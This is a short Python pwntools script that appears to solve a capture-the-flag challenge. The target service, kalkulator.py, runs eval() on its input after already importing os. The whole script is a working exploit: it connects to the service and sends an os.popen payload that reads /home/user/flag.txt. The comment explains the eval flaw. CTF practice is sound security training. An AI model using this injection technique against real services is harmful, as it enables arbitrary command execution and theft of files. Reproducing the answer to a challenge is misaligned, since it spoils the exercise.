import os

from pwn import *

# kalkulator.py runs `eval(exp)` directly on attacker-controlled input with no
# sanitization/blocklist at all, and it has already done `import os` in its
# global namespace (even prints "module 'os' is imported!" as a hint).
# Since eval() shares the module's globals, the imported `os` module is
# directly reachable from the expression we send, so we can just call
# os.popen(...) to run an arbitrary shell command and read the flag.

p = remote(os.environ["SERVICE_APP_MAIN_HOST"], int(os.environ["SERVICE_APP_MAIN_PORT"]))

p.recvuntil(b">> ")
p.sendline(b"os.popen('cat /home/user/flag.txt').read()")

out = p.recvline(timeout=10).decode(errors="replace")
print(out)

p.close()
